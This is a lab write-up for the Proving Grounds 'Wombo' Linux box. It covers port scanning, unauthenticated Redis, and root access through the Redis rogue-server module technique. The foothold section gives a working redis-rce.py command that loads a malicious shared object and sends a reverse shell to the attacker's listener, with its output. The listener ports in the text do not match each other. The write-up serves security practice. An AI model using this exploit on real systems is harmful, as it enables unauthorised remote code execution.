---
title: "Wombo - Writeup"
linkTitle: "Wombo"
weight: 6
featured: true
platform: "PG"
name: "Wombo"
os: "Linux"
difficulty: "Medium"
release: "03 Jul 2026"
ip: "192.168.109.69"
# Drop a real avatar at static/img/pg/wombo.png and uncomment:
# avatar: "/img/pg/wombo.png"
tags: ["linux", "redis", "unauthenticated", "rogue-server", "nodebb", "root-shell"]
description: "Medium Linux box. An unauthenticated Redis instance, missed entirely by a default nmap scan, gives root through the classic rogue-server module RCE."
---

{{< htb name="Wombo" os="Linux" difficulty="Medium" release="03 Jul 2026" ip="192.168.109.69" platform="PG" >}}

## Reconnaissance

A default top-1000 scan would miss the interesting ports here, so go straight to a full range scan.

```
(root㉿kali)# nmap 192.168.109.69 -p- -T5
```

```
PORT      STATE  SERVICE
22/tcp    open   ssh
53/tcp    closed domain
80/tcp    open   http
6379/tcp  open   redis
8080/tcp  open   http-proxy
27017/tcp open   mongod
```

```
(root㉿kali)# nmap 192.168.109.69 -sCV -p22,53,80,8080,6379,27017
```

```
22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7
80/tcp   open   http       nginx 1.10.3
8080/tcp open   http-proxy NodeBB
6379/tcp open   redis      Redis key-value store 5.0.9
27017/tcp open   mongodb    MongoDB 4.0.18
```

## Enumeration

Port 80 is a default nginx welcome page, a dead end. NodeBB on 8080 is a real forum app, but nothing points to a quick exploit there. MongoDB requires authentication for every command tested. Redis, on the other hand, answers with zero authentication at all, an immediate target.

## Initial Foothold

Unauthenticated Redis is a known path to RCE through the rogue-server module technique, abusing `SLAVEOF` to load a malicious shared object.

```
(root㉿kali)# python redis-rce.py -r 192.168.109.69 -L 192.168.45.187 -p 6379 -P 80 -f redis-rogue-server/exp.so
```

```
[*] Connecting to 192.168.109.69:6379...
[*] Sending SLAVEOF command to server
[+] Accepted connection from 192.168.109.69:6379
[*] Start listening on 192.168.45.187:80
[+] Accepted connection from 192.168.109.69:41667
[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: r
[+] Reverse shell payload sent.
```

Catch the callback.

```
(root㉿kali)# nc -lnvp 22
```

```
connect to [192.168.45.187] from (UNKNOWN) [192.168.109.69] 55128
```

The shell can walk straight into `/root` and read the flag, no privilege boundary in the way.

```
cd root
cat proof.txt
```

```
3be429656c3be9cf100f8d1680a2a443
```

## Privilege Escalation

None needed. Redis on this box runs with enough privilege that the rogue-server RCE lands directly in `/root`.

## Lessons learned

- A default nmap scan only checks the top 1000 ports. Redis, MongoDB, and the real HTTP proxy here all sat outside that range, run a full `-p-` sweep before deciding a box is quiet.
- Cross-check with a second scanner when it matters. A single tool missing or misreporting a port is a real risk, pairing nmap with something like rustscan catches what one alone might not.
- Don't skip UDP. `-sU` covers a whole class of services a TCP-only scan will never show, make it a standing habit, not an afterthought.
- The moment a service answers with no authentication at all, that's the one to prioritize. Redis needing zero credentials here was a bigger signal than NodeBB's larger, more complex attack surface.
